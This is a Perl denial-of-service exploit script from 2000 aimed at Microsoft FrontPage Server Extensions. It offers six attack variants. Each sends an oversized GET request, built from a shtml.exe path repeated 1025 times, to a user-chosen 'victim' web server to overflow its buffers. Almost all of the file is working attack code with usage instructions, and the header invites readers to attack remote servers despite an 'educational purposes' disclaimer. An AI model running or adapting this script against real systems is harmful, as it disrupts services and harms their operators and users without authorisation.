   #!/usr/bin/perl
   #####################################################################
   # Fpage-DoS.pl                              #
   #                                   #
   # Info based attacks DoS Front page! Xato Security          #
   # Nick & programer: alt3kx                      #
   # (c) 2000 alt3kx_h3z <alt3kx_h3z@raza-mexicana.org>                #
   #                                   #
   #  w w w . r a z a - m e x i c a n a . o r g                #
   #  w w w . h e r t m x . o r g                      #
   #                                   #
   # Xploit for the program front page, to exploit this vunerability   #
   # you must have the extensions "/ _ vti_bin/shtml.exe in your       #
   # server, you can select some one of the attacks to Fuck! a remote  #
   # server..                              #
   #                                   #
   # Demonstration script to remotely overflow various server buffers, #
   # resulting in a denial of service, for TESTING purposes only.      #
   # Runs on *nix & Windows with perl.                 #
   #                                   #
   #  Use: perl fpage-DoS.pl -h www.server.com -t <Type Attack>        #
   #   perl fpage-DoS.pl -h www.server.com -v <List Attack>        #
   #                                       #
   # Greet to: Packet Storm and Ken, ADM crew, dr_fdisk^ (k00l friend),#
   # Raregazz, X-ploit, 0x90 (next Work!).                 #
   # Winner Vicente FOX and sucks PFP!                 #
   #                                   #
   # THIS PROGRAM IS VERY DANGEROUS THE USE OF THIS PROGRAM IS         #
   # ONLY FOR EDUCATIONAL PURPOSES                     #
   #                                   #
   #####################################################################

   use IO::Socket;
   use Getopt::Std;
   getopts('h:t:v', \%args);
   if(!defined($args{h}) && !defined($args{t})) {
   print  qq~Usage:    $0 -h <victim> -t <number>

       -h victim to test remote overflow DoS on
       -t server type (check the -v option for list)
       -v lists all vulnerable to each DoS

   ~; exit; }

   if(defined($args{v})) { &Attacks; }
   if(defined($args{h}) && defined($args{t})){
   if(($args{t}) == 1)  { &fpage;         }
   if(($args{t}) == 2)  { &fpagedos;    }
   if(($args{t}) == 3)  { &fpagetres;      }
   if(($args{t}) == 4)  { &fpagecuatro;  }
   if(($args{t}) == 5)  { &fpagecinco; }
   if(($args{t}) == 6)  { &fpageseis;   }}

   ##################################################################

   sub Attacks {
   print qq~
   ______________________________________________________________________________
                       LIST ALL ATTACKS
   ______________________________________________________________________________

   [1] /_vti_bin/shtml.exe             [2] /_vti_bin/shtml.exe/mailslot.htm

   [3] /_vti_bin/shtml.exe/pipe.htm    [4] /_vti_bin/shtml.exe/unc.htm

   [5] /_vti_bin/shtml.exe/com1.asp       [6] /_vti_bin/shtml.exe/com1.

   ______________________________________________________________________________

   ~; exit; }


   sub fpage {
   $victim=$args{h};
   $denial .="/_vti_bin/shtml.exe" x 1025;
   $url = "/$denial";
       $socket = IO::Socket::INET->new (Proto => "tcp",
                        PeerAddr => $victim,
                        PeerPort => "80") or die "Can't connect.\n";
   print $socket "GET $url\n";
   print "\nSent overflow to $victim\n";
   close $socket; }

   ###############################################################

   sub fpagedos {
   $victim=$args{h};
   $denial .="/_vti_bin/shtml.exe/mailslot.htm" x 1025;
   $url = "/$denial";
       $socket = IO::Socket::INET->new (Proto => "tcp",
                        PeerAddr => $victim,
                        PeerPort => "80") or die "Can't connect.\n";
   print $socket "GET $url\n";
   print "\nSent overflow to $victim\n";
   close $socket; }

   ################################################################

   sub fpagetres {
   $victim=$args{h};
   $denial .="/_vti_bin/shtml.exe/pipe.htm" x 1025;
   $url = "/$denial";
       $socket = IO::Socket::INET->new (Proto => "tcp",
                        PeerAddr => $victim,
                        PeerPort => "80") or die "Can't connect.\n";
   print $socket "GET $url\n";
   print "\nSent overflow to $victim\n";
   close $socket; }

   ################################################################

   sub fpagecuatro {
   $victim=$args{h};
   $denial .="/_vti_bin/shtml.exe/unc.htm" x 1025;
   $url = "/$denial";
       $socket = IO::Socket::INET->new (Proto => "tcp",
                        PeerAddr => $victim,
                        PeerPort => "80") or die "Can't connect.\n";
   print $socket "GET $url\n";
   print "\nSent overflow to $victim\n";
   close $socket; }

   ################################################################

   sub fpagecinco {
   $victim=$args{h};
   $denial .="/_vti_bin/shtml.exe/com1.asp" x 1025;
   $url = "/$denial";
       $socket = IO::Socket::INET->new (Proto => "tcp",
                        PeerAddr => $victim,
                        PeerPort => "80") or die "Can't connect.\n";
   print $socket "GET $url\n";
   print "\nSent overflow to $victim\n";
   close $socket; }

   ################################################################

   sub fpageseis {
   $victim=$args{h};
   $denial .="/_vti_bin/shtml.exe/com1." x 1025;
   $url = "/$denial";
       $socket = IO::Socket::INET->new (Proto => "tcp",
                        PeerAddr => $victim,
                        PeerPort => "80") or die "Can't connect.\n";
   print $socket "GET $url\n";
   print "\nSent overflow to $victim\n";
   close $socket; }

   ##################################################################
